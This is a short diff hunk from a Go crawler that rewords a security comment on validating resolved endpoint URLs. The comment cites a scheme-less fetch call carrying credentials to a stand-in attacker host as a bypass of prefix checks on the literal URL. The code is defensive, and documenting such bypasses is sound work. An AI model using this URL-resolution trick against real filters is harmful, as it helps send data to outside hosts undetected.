@@ -53,8 +53,8 @@ func toRequests(endpoints []ExtractedEndpoint, captureURL string) []crawl.Observ
 		}
 		req.URL = resolveURL(ep.URL, base)
 
-		// SEC-BE-001 / SEC-BE-002: validate the RESOLVED URL, not the literal, and here
-		// rather than per-producer — this is the single point at which the final URL exists.
+		// Validate the RESOLVED URL, not the literal, and here rather than per-producer —
+		// this is the single point at which the final URL exists.
 		// A prefix test on the literal misses `fetch("//u:p@attacker.example/api/collect")`,
 		// which carries no scheme; base.ResolveReference then COPIES ref.User and inherits
 		// the base scheme, reconstituting the same userinfo as an absolute URL. Nothing
